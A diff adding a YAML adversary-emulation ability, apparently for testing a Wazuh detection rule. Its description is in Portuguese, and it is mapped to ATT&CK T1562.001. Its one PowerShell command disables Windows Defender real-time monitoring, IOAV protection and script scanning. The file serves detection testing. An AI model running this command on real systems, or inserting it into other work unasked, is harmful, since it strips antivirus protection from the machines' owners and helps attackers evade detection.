@@ -1,0 +1,16 @@
+- requirements: []
+  name: '[CORP] [Wazuh] [110022] Desativar Windows Defender'
+  description: Desativa o Windows Defender em um PowerShell elevado
+  tactic: defense-evasion
+  technique_id: T1562.001
+  technique_name: 'Impair Defenses: Disable or Modify Tools'
+  executors:
+  - cleanup: []
+    timeout: 60
+    platform: windows
+    name: psh
+    payloads: []
+    parsers: []
+    command: Set-MpPreference -DisableRealtimeMonitoring $true -DisableIOAVProtection
+      $true -DisableScriptScanning $true -Verbose;
+  id: e2df09ce-1f7c-4592-a3f0-f901e9b31c38
